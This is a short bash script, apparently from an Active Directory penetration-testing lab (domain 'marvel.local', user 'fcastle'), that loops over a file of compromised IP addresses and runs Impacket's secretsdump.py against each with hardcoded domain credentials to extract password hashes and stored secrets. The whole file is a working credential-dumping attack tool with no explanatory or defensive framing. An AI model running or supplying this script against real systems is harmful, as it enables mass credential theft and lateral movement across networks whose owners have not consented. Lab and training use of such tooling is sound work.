#!/bin/bash

PWNED_TARGET="pwned_ip.txt"

DOMAIN='marvel.local'
USERNAME='fcastle'
PASSWORD='Password1'

# Check if the pwned IPs file exists
if [[ ! -f "$PWNED_TARGET" ]]; then
    echo "Error: File $PWNED_TARGET not found!"
    exit 1
fi

# Loop through each IP in the pwned IPs file
while IFS= read -r ip; do
    echo "Processing IP: $ip"
    
    # Run secretsdump against the current IP
    secretsdump.py "$DOMAIN/$USERNAME:$PASSWORD@$ip"

    # Check if the secretsdump command was successful
    if [[ $? -eq 0 ]]; then
        echo "Secretsdump succeeded for IP: $ip"
    else
        echo "Secretsdump failed for IP: $ip"
    fi

    echo "---------------------------------------------"

done < "$PWNED_TARGET"

echo "All IPs processed!"
